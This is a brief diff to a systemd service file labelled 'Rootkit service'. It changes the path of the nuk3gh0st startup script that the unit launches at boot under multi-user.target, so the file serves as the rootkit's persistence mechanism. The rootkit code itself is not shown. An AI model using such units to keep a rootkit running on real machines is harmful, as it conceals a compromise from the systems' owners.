@@ -2,7 +2,7 @@
 Description=Rootkit service
 
 [Service]
-ExecStart=/usr/lib/nuk3gh0st.startup
+ExecStart=/usr/share/nuk3gh0st/nuk3gh0st.startup
 
 [Install]
 WantedBy=multi-user.target
